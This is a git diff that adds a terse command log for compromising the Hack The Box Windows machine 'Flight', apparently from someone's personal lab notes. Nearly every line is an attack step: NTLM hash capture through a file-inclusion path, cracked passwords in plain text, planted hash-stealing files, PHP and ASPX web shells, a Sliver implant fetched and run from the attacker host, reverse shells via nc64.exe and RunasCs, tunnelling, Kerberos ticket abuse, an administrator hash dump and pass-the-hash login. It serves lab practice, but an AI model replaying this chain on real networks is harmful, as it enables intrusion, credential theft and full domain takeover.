@@ -145,6 +145,100 @@ https://0xdf.gitlab.io/2019/05/18/htb-conceal.html
 ```
 
 
+# Win-Flight
+```
+nmap -sS -sC -sV -T5 -Pn 10.10.11.187
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.11.187/FUZZ -fs 301 -e .aspx,.php,.txt,.html,.sh
+http://10.10.11.187/js/
+http://10.10.11.187/webalizer
+smbclient -L \\\\10.10.11.187\\
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://flight.htb/ -H "Host: FUZZ.flight.htb" -fs 7069 -fw 22
+http://school.flight.htb/
+http://school.flight.htb/index.php?view=C:\Windows\System32\drivers\etc\hosts
+http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
+responder -I tun0 -v
+http://school.flight.htb/index.php?view=//10.10.14.10/htb
+john hash -w=/usr/share/wordlists/rockyou.txt
+crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13'
+smbclient -L \\\\10.10.11.187\\ -U flight.htb/svc_apache
+smbclient \\\\10.10.11.187\\Users -U flight.htb/svc_apache
+ldapdomaindump -u flight\\svc_apache -p 'S@Ss!K@*t13' 10.10.11.187
+cat domain_users.grep | grep "Domain Users" | awk -F' ' '{print $1}'
+crackmapexec smb 10.10.11.187 -u users_all2 -p 'S@Ss!K@*t13'
+smbclient \\\\10.10.11.187\\Users -U flight.htb/S.Moon
+responder -I tun0 -v
+git clone https://github.com/Greenwolf/ntlm_theft
+cd ntlm_theft
+python3 ntlm_theft.py --generate all --server 10.10.14.67 --filename htb
+impacket-smbclient s.moon:'S@Ss!K@*t13'@flight.htb
+use Shared
+put htb/htb.scf
+put htb/desktop.ini
+john hash2 -w=/usr/share/wordlists/rockyou.txt
+smbmap -H flight.htb -u 'c.bum' -p 'Tikkycoll_431012284’
+smbclient \\\\10.10.11.187\\Users -U flight.htb/c.bum
+shell.php
+impacket-smbclient c.bum:'Tikkycoll_431012284'@flight.htb
+use Web
+cd flight.htb
+put shell.php
+curl 'http://flight.htb/shell.php?c=whoami'
+curl https://sliver.sh/install|sudo bash
+sliver
+service sliver start
+generate --os windows --arch 64bit --mtls 10.10.14.10 --reconnect 60 --save htb.exe
+mtls
+sudo python3 -m http.server 80
+curl 'http://flight.htb/shell.php?c=powershell%20-c%20%22wget%2010.10.14.10%2Fhtb.exe%20-usebasicparsing%20-outfile%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe%3B%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe’
+powershell -c "wget 10.10.14.67/htb.exe
+-usebasiparsing -outfile C:\users\public\music\htb.exe; C:\users\public\music\htb.exe
+sessions -i ce7
+whoami
+upload RunasCs.exe
+shell
+.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.10:443 cmd
+rlwrap -cAr nc -lnvp 443
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+gunzip chisel_1.9.1_linux_amd64.gz
+cd C:\ProgramData
+powershell -c wget 10.10.14.10/chisel_1.9.1_windows_amd64 -outfile c.exe
+./chisel_1.9.1_linux_amd64 server -p 8000 --reverse
+.\c.exe client 10.10.14.10:8000 R:8001:127.0.0.1:8000
+http://127.0.0.1:8001/
+[Open another terminal]
+OR
+powershell -c wget 10.10.14.10/RunasCs.exe -outfile RunasCs.exe
+rlwrap -cAr nc -lnvp 443
+.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.10:443 cmd
+whoami /all
+https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
+cd C:\inetpub\development
+powershell -c wget 10.10.14.10/cmd.aspx -outfile cmd.aspx
+http://127.0.0.1:8001/cmd.aspx
+wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
+cd C:\ProgramData
+powershell -c wget 10.10.14.10/nc64.exe -outfile nc64.exe
+cd C:\inetpub\development
+powershell -c wget 10.10.14.10/cmd.aspx -outfile cmd.aspx
+http://127.0.0.1:8001/cmd.aspx
+/c \ProgramData\nc64.exe -e cmd 10.10.14.10 443
+rlwrap -cAr nc -lnvp 443
+cd C:\ProgramData
+powershell -c wget 10.10.14.10/Rubeus.exe -outfile Rubeus.exe
+.\rubeus.exe tgtdeleg /nowrap
+cat ticket.b64 | base64 -d > ticket2.kirbi
+impacket-ticketConverter ./ticket3.kirbi ticket.ccache
+export KRB5CCNAME=ticket.ccache
+sudo service virtualbox-guest-utils stop
+sudo ntpdate -s 10.10.11.187
+10.10.11.187 g0.flight.htb
+./secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator
+impacket-psexec administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
+type ..\..\Users\Administrator\Desktop\root.txt
+```
+
+
 # Win-Forest
 https://0xdf.gitlab.io/2020/03/21/htb-forest.html
 ```
